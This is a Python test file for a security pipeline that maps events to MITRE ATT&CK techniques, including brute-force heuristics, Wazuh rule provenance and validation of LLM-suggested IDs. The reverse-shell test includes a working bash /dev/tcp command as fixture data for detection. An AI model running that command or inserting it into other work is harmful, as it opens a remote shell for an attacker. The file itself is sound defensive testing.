"""MITRE ATT&CK mapping: catalog, heuristics, provenance and LLM validation."""
from soar.pipeline import mitre
from soar.pipeline.normalizer import normalize


def ev(source="generic", **kw):
    return normalize(source, {"timestamp": "2026-03-06T12:00:00Z", "host": "h1", **kw})


def fails(user, ip="91.219.236.222", n=1):
    return normalize("generic", {"timestamp": "2026-03-06T12:00:00Z", "event_type": "authentication_failure", "severity": 2,
                                 "src_ip": ip, "host": "h1", "user": user, "metadata": {"failed_logins": n}})


def by_id(maps):
    return {m.technique_id: m for m in maps}


def test_catalog_lookup_and_subtechnique_structure():
    assert mitre.lookup("t1110")["name"] == "Brute Force"
    assert mitre.lookup("T1110.001")["parent"] == "T1110"
    assert mitre.lookup("T9999") is None
    assert all(parent in mitre.CATALOG for _, _, parent in mitre.CATALOG.values() if parent)


def test_brute_force_needs_enough_failures():
    assert mitre.from_rules([fails("root", n=2)]) == []
    m = by_id(mitre.from_rules([fails("root", n=8)]))
    assert m["T1110"].confidence == 0.75 and m["T1110"].source == "rule_engine" and m["T1110.001"].subtechnique == "Password Guessing"


def test_password_spraying_across_accounts():
    m = by_id(mitre.from_rules([fails(u) for u in ("alice", "bob", "carol", "dave", "erin", "frank")]))
    assert "T1110.003" in m and "T1110.001" not in m


def test_success_after_failures_maps_valid_accounts():
    ok = normalize("generic", {"timestamp": "2026-03-06T12:05:00Z", "event_type": "authentication_success", "src_ip": "91.219.236.222", "host": "h1"})
    assert "T1078" in by_id(mitre.from_rules([fails("root", n=6), ok]))
    assert "T1078" not in by_id(mitre.from_rules([ok]))


def test_reverse_shell_command_and_unrelated_command():
    shell = ev(event_type="suspicious_process", severity=3, command="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    m = by_id(mitre.from_rules([shell]))
    assert m["T1059"].tactic == "Execution" and "T1059.004" in m
    assert mitre.from_rules([ev(event_type="suspicious_process", severity=3, command="ls -la /tmp")]) == []


def test_sensitive_file_integrity_is_a_low_confidence_heuristic():
    e = normalize("wazuh", {"rule": {"id": "550", "level": 7, "groups": ["syscheck"], "description": "Integrity checksum changed."},
                            "agent": {"name": "h1"}, "syscheck": {"path": "/etc/shadow"}})
    m = by_id(mitre.from_rules([e]))
    assert m["T1098"].confidence == 0.4 and "heuristic" in m["T1098"].evidence
    e.metadata["fim_path"] = "/tmp/x"
    assert mitre.from_rules([e]) == []


def test_event_types_map_to_expected_techniques():
    for etype, tid in (("network_scan", "T1046"), ("web_attack", "T1190"), ("privilege_escalation", "T1548"), ("data_exfiltration", "T1041")):
        assert tid in by_id(mitre.from_rules([ev(event_type=etype, severity=3)]))
    assert mitre.from_rules([ev(event_type="totally_benign")]) == []  # nothing is guessed


def test_wazuh_ids_win_over_heuristics_and_keep_provenance():
    e = normalize("wazuh", {"rule": {"id": "100001", "level": 10, "frequency": 9, "groups": ["authentication_failures"],
                                     "description": "Multiple SSH authentication failures",
                                     "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]}},
                            "agent": {"name": "h1"}, "data": {"srcip": "91.219.236.222", "dstuser": "root"}})
    merged = by_id(mitre.map_events([e]))
    assert merged["T1110"].source == "wazuh_rule" and merged["T1110"].confidence == 0.9


def test_wazuh_technique_outside_the_catalog_is_trusted_but_not_embellished():
    e = normalize("wazuh", {"rule": {"id": "9", "level": 8, "description": "x",
                                     "mitre": {"id": ["T1555"], "tactic": ["Credential Access"], "technique": ["Credentials from Password Stores"]}},
                            "agent": {"name": "h1"}})
    m = by_id(mitre.from_wazuh([e]))["T1555"]
    assert (m.technique_name, m.tactic, m.source) == ("Credentials from Password Stores", "Credential Access", "wazuh_rule")
    e2 = normalize("wazuh", {"rule": {"id": "9", "level": 8, "description": "x", "mitre": {"id": ["T1555"]}}, "agent": {"name": "h1"}})
    assert mitre.from_wazuh([e2]) == []  # no name given and not in the catalog: nothing is fabricated


def test_llm_suggestions_are_validated_capped_and_marked():
    ok, rejected = mitre.from_llm([{"id": "t1110", "confidence": 0.99, "evidence": "e"}, {"id": "T0000"}, {"id": "not-an-id"}])
    assert [m.technique_id for m in ok] == ["T1110"] and ok[0].source == "llm_inferred" and ok[0].confidence == 0.7
    assert rejected == ["T0000", "NOT-AN-ID"]
